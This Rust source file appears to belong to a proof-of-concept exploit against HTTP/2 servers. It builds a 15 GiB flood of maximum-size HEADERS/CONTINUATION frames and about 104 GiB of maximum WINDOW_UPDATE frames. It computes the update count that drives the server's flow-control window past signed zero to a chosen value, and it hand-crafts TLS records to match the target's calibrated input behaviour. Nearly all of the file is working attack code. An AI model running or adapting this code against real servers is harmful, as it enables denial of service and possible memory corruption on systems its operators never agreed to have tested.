//! The traffic-heavy stages, in one process: the 15 GiB flood-budget carrier
//! and the ~104 GiB stream of legal connection WINDOW_UPDATEs.
//!
//! TLS record boundaries are part of the calibration, so this writer emits
//! records itself instead of using a generic `send_all`.

use std::io;
use std::time::Instant;

use anyhow::{bail, Result};

use crate::h2::{CONTINUATION, END_HEADERS, END_STREAM, HEADERS, MAX_WINDOW};
use crate::tls::{RawTls, TLS_RECORD_PLAINTEXT};

#[derive(Clone, Debug, Default)]
pub struct Ledger {
    pub carrier_frames: u64,
    pub frames_per_request: u64,
    pub carrier_requests: u64,
    pub carrier_payload_bytes: u64,
    pub carrier_frame_bytes: u64,
    pub first_sid: u32,
    pub next_sid: u32,
    pub wu_count: u64,
    pub wu_initial_phase: u8,
    pub start_sequence: u64,
    pub final_sequence: u64,
    pub records: u64,
    pub application_bytes: u64,
    pub wire_bytes: u64,
    pub elapsed_seconds: f64,
}

pub fn expected_carrier_records(frames: u64, payload: u64) -> u64 {
    frames * ((payload + 9 + TLS_RECORD_PLAINTEXT as u64 - 1) / TLS_RECORD_PLAINTEXT as u64)
}

struct Emitter<'a> {
    tls: &'a mut RawTls,
    app: Vec<u8>,
    wire: Vec<u8>,
}

impl<'a> Emitter<'a> {
    fn new(tls: &'a mut RawTls) -> Self {
        Self { tls, app: Vec::with_capacity(TLS_RECORD_PLAINTEXT), wire: Vec::with_capacity(1 << 20) }
    }

    fn push(&mut self, mut bytes: &[u8]) -> io::Result<()> {
        while !bytes.is_empty() {
            let take = (TLS_RECORD_PLAINTEXT - self.app.len()).min(bytes.len());
            self.app.extend_from_slice(&bytes[..take]);
            bytes = &bytes[take..];
            if self.app.len() == TLS_RECORD_PLAINTEXT {
                self.flush_record()?;
            }
        }
        Ok(())
    }

    fn flush_record(&mut self) -> io::Result<()> {
        if self.app.is_empty() {
            return Ok(());
        }
        let record = self.tls.writer.record(&self.app, 23);
        self.app.clear();
        self.wire.extend_from_slice(&record);
        if self.wire.len() >= 1 << 20 {
            self.flush_wire()?;
        }
        Ok(())
    }

    fn flush_wire(&mut self) -> io::Result<()> {
        if self.wire.is_empty() {
            return Ok(());
        }
        self.tls.write_encrypted(&self.wire)?;
        self.wire.clear();
        Ok(())
    }
}

/// Emit `frames` physical HEADERS/CONTINUATION frames. Each request uses
/// `frames_per_request` frames and ends with the HPACK `head` block.
#[allow(clippy::too_many_arguments)]
pub fn send_carrier(
    tls: &mut RawTls,
    frames: u64,
    frames_per_request: u64,
    first_sid: u32,
    payload_bytes: u32,
    filler_hex: &str,
    head: &[u8],
    progress: &mut dyn FnMut(u64, u64),
) -> Result<Ledger> {
    if frames_per_request == 0 || (frames != 0 && frames % frames_per_request != 0) {
        bail!("carrier_frames must be a multiple of frames_per_request");
    }
    if payload_bytes < head.len() as u32 {
        bail!("carrier payload is smaller than the request head");
    }
    let filler = match filler_hex {
        "" | "20" => vec![0x20u8],
        "3f808000" => vec![0x3f, 0x80, 0x80, 0x00],
        other => bail!("unsupported carrier filler {other:?}"),
    };
    let started = Instant::now();
    let start_sequence = tls.writer.sequence;
    let start_records = tls.writer.records;
    let start_app = tls.writer.app_bytes;
    let start_wire = tls.writer.wire_bytes;
    let mut sid = first_sid;
    let mut emitter = Emitter::new(tls);
    for index in 0..frames {
        let in_request = index % frames_per_request;
        let kind = if in_request == 0 { HEADERS } else { CONTINUATION };
        let flags = (if in_request == 0 { END_STREAM } else { 0 })
            | (if in_request + 1 == frames_per_request { END_HEADERS } else { 0 });
        let mut header = [0u8; 9];
        header[0] = (payload_bytes >> 16) as u8;
        header[1] = (payload_bytes >> 8) as u8;
        header[2] = payload_bytes as u8;
        header[3] = kind;
        header[4] = flags;
        header[5..9].copy_from_slice(&sid.to_be_bytes());
        emitter.push(&header)?;

        let mut filler_bytes = payload_bytes as usize;
        if in_request + 1 == frames_per_request {
            filler_bytes -= head.len();
        }
        if filler.len() == 1 {
            let byte = [filler[0]; 4096];
            let mut left = filler_bytes;
            while left > 0 {
                let take = left.min(byte.len());
                emitter.push(&byte[..take])?;
                left -= take;
            }
        } else if filler_bytes > 0 {
            // Keep every encoded integer inside this physical H2 frame, then
            // restore a canonical zero table-size update at the boundary.
            let fast_bytes = (filler_bytes - 1) & !3usize;
            let mut pattern = Vec::with_capacity(4096);
            let mut phase = 0usize;
            while pattern.len() < 4096 {
                pattern.push(filler[phase % filler.len()]);
                phase += 1;
            }
            let mut left = fast_bytes;
            while left > 0 {
                let take = left.min(pattern.len());
                emitter.push(&pattern[..take])?;
                left -= take;
            }
            let tail = vec![0x20u8; filler_bytes - fast_bytes];
            emitter.push(&tail)?;
        }
        if in_request + 1 == frames_per_request {
            emitter.push(head)?;
            sid += 2;
        }
        // Do not coalesce across physical H2 frames: their TLS boundaries are
        // part of the calibrated input-event behaviour.
        emitter.flush_record()?;
        if (index + 1) % 64 == 0 || index + 1 == frames {
            progress(index + 1, frames);
        }
    }
    emitter.flush_wire()?;
    let records = tls.writer.records - start_records;
    let ledger = Ledger {
        carrier_frames: frames,
        frames_per_request,
        carrier_requests: frames / frames_per_request,
        carrier_payload_bytes: frames * payload_bytes as u64,
        carrier_frame_bytes: frames * (payload_bytes as u64 + 9),
        first_sid,
        next_sid: sid,
        start_sequence,
        final_sequence: tls.writer.sequence,
        wu_count: 0,
        wu_initial_phase: 0,
        records,
        application_bytes: tls.writer.app_bytes - start_app,
        wire_bytes: tls.writer.wire_bytes - start_wire,
        elapsed_seconds: started.elapsed().as_secs_f64(),
    };
    let expected_records = expected_carrier_records(frames, payload_bytes as u64);
    let expected_application = frames * (payload_bytes as u64 + 9);
    if ledger.records != expected_records
        || ledger.application_bytes != expected_application
        || ledger.wire_bytes != expected_application + 22 * expected_records
        || ledger.final_sequence != start_sequence + expected_records
        || ledger.next_sid != first_sid + 2 * (frames / frames_per_request) as u32
    {
        bail!(
            "carrier ledger mismatch: records={} app={} wire={} seq={} next_sid={}",
            ledger.records,
            ledger.application_bytes,
            ledger.wire_bytes,
            ledger.final_sequence,
            ledger.next_sid
        );
    }
    Ok(ledger)
}

/// Emit `count` maximum-size connection WINDOW_UPDATE frames, packed into TLS
/// records starting at byte `phase` of the 13-byte frame.
///
/// The stream is a periodic 13-byte pattern, so independent slices can be
/// encrypted in parallel at known TLS sequence numbers and written in order.
pub fn send_window_updates(
    tls: &mut RawTls,
    count: u64,
    phase: u8,
    progress: &mut dyn FnMut(u64, u64),
) -> Result<Ledger> {
    if phase >= 13 {
        bail!("wu_phase must be 0..12");
    }
    let started = Instant::now();
    let start_sequence = tls.writer.sequence;
    let start_records = tls.writer.records;
    let start_app = tls.writer.app_bytes;
    let start_wire = tls.writer.wire_bytes;
    let total = count
        .checked_mul(13)
        .ok_or_else(|| anyhow::anyhow!("WINDOW_UPDATE byte count overflow"))?;
    let template = tls.writer.clone();

    const SLICE: u64 = 8 << 20; // multiple of the TLS record size
    let workers = std::env::var("POC_THREADS")
        .ok()
        .and_then(|value| value.parse::<u64>().ok())
        .unwrap_or(1)
        .clamp(1, 16);
    let round = SLICE * workers;
    let mut done = 0u64;
    while done < total {
        let remaining = total - done;
        let n = remaining.min(round);
        let mut parts = Vec::with_capacity(workers as usize);
        let mut offset = 0u64;
        while offset < n {
            let take = SLICE.min(n - offset);
            parts.push((offset, take));
            offset += take;
        }
        let results: Vec<Vec<u8>> = std::thread::scope(|scope| {
            let template = &template;
            let handles: Vec<_> = parts
                .iter()
                .map(|(offset, length)| {
                    let offset = *offset;
                    let length = *length;
                    scope.spawn(move || {
                        encrypt_window_range(template, phase, start_sequence, done + offset, length)
                    })
                })
                .collect();
            handles
                .into_iter()
                .map(|handle| handle.join().expect("WINDOW_UPDATE worker"))
                .collect()
        });
        for slice in results {
            tls.write_encrypted(&slice)?;
        }
        done += n;
        progress(done / 13, count);
    }

    let records = (total + TLS_RECORD_PLAINTEXT as u64 - 1) / TLS_RECORD_PLAINTEXT as u64;
    tls.writer.sequence = start_sequence + records;
    tls.writer.records = start_records + records;
    tls.writer.app_bytes = start_app + total;
    tls.writer.wire_bytes = start_wire + total + 22 * records;
    progress(count, count);
    let ledger = Ledger {
        carrier_frames: 0,
        frames_per_request: 0,
        carrier_requests: 0,
        carrier_payload_bytes: 0,
        carrier_frame_bytes: 0,
        first_sid: 0,
        next_sid: 0,
        wu_count: count,
        wu_initial_phase: phase,
        start_sequence,
        final_sequence: tls.writer.sequence,
        records,
        application_bytes: total,
        wire_bytes: total + 22 * records,
        elapsed_seconds: started.elapsed().as_secs_f64(),
    };
    if ledger.application_bytes != count * 13
        || ledger.wire_bytes != count * 13 + 22 * records
        || ledger.final_sequence != start_sequence + records
    {
        bail!(
            "WINDOW_UPDATE ledger mismatch: records={} app={} wire={} seq={}",
            ledger.records,
            ledger.application_bytes,
            ledger.wire_bytes,
            ledger.final_sequence
        );
    }
    Ok(ledger)
}

/// Encrypt one contiguous range of the repeated WINDOW_UPDATE byte stream.
fn encrypt_window_range(
    writer: &crate::tls::RecordWriter,
    phase: u8,
    start_sequence: u64,
    absolute: u64,
    length: u64,
) -> Vec<u8> {
    let frame = [0u8, 0, 4, 8, 0, 0, 0, 0, 0, 0x7f, 0xff, 0xff, 0xff];
    let mut pattern = [0u8; TLS_RECORD_PLAINTEXT + 13];
    for (index, byte) in pattern.iter_mut().enumerate() {
        *byte = frame[index % 13];
    }
    let mut output = Vec::with_capacity(length as usize + (length as usize / TLS_RECORD_PLAINTEXT + 1) * 22);
    let mut position = absolute;
    let mut left = length;
    let mut sequence = start_sequence + absolute / TLS_RECORD_PLAINTEXT as u64;
    while left > 0 {
        let take = (left as usize).min(TLS_RECORD_PLAINTEXT);
        let start = ((phase as u64 + position) % 13) as usize;
        output.extend(writer.encrypt_record(
            sequence,
            &pattern[start..start + take],
            23,
        ));
        sequence += 1;
        position += take as u64;
        left -= take as u64;
    }
    output
}

/// Find a legal final increment after enough MAX updates cross signed zero.
pub fn near_wrap(start: u64, distance: u64) -> Result<(u64, u64)> {
    let target = distance.wrapping_neg();
    for extra in 0..8u64 {
        let count = (1u64 << 33) + extra;
        let current = start.wrapping_add(count.wrapping_mul(MAX_WINDOW as u64));
        let tailored = target.wrapping_sub(current);
        if (1..=MAX_WINDOW as u64).contains(&tailored) {
            return Ok((count, tailored));
        }
    }
    bail!("could not construct legal near-wrap transition")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn near_wrap_is_legal_and_lands_on_distance() {
        let start = 2 * MAX_WINDOW as u64 + 1792 - 10;
        let (count, tailored) = near_wrap(start, 14392).unwrap();
        assert!(count >= 1 << 33 && count < (1 << 33) + 8);
        assert!((1..=MAX_WINDOW as u64).contains(&tailored));
        let end = start
            .wrapping_add(count.wrapping_mul(MAX_WINDOW as u64))
            .wrapping_add(tailored);
        assert_eq!(end, (-(14392i64)) as u64);
    }

    #[test]
    fn carrier_ledger_arithmetic() {
        assert_eq!(expected_carrier_records(3, 16_777_215), 3 * 1025);
        assert_eq!(expected_carrier_records(960, 16_777_215), 960 * 1025);
    }
}
